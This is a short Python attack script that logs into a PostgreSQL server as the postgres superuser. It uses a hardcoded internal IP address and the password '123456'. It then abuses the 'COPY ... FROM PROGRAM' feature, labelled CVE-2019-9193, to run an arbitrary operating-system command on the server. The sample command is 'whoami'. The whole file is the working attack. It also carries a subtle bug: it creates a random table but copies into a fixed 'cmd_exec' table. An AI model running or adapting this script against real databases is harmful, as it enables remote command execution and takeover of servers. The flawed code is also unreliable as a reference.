#!/usr/bin/python
import string
import psycopg2
import random


def random_str(l):
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(l))


def random_num(l):
    return ''.join(str(random.randrange(0, 10)) for _ in range(l))


def connect(host, password, port="5432", user="postgres", db="template1", client_encoding="UTF-8"):
    try:
        conn = psycopg2.connect(database=db, user=user, password=password, host=host, port=port,
                                client_encoding=client_encoding)
        print("Opened database successfully")
        return conn
    except:
        print("Connect fail")
        exit(-1)


def sql_query(conn, sql):
    cur = conn.cursor()
    print(sql)
    cur.execute(sql)
    conn.commit()
    try:
        rows = cur.fetchall()
        print(rows)
    except Exception as e:
        print(e)
        pass


def quit(conn):
    conn.close()


def rce(cmd_to_go, encode_type="UTF8"):
    # encode_type in ["GBK", "UTF8"]
    # CVE-2019-9193
    random_table = random_str(5)
    commands = [
        "DROP TABLE IF EXISTS %s;" % random_table,
        "CREATE TABLE %s(cmd_output text);" % random_table,
        "COPY cmd_exec FROM PROGRAM '%s';" % cmd_to_go
    ]
    for sql in commands:
        sql_query(connect(host=host, password=password, client_encoding=encode_type), sql)

    commands = [
        "SELECT * FROM %s;" % random_table,
        "DROP TABLE IF EXISTS %s;" % random_table
    ]
    for sql in commands:
        sql_query(connect(host=host, password=password, client_encoding="utf8"), sql)


password = "123456"
host = "192.168.18.146"
rce("whoami", "GBK")
# sql_query(connect(host=host, password=password), "show server_version;")
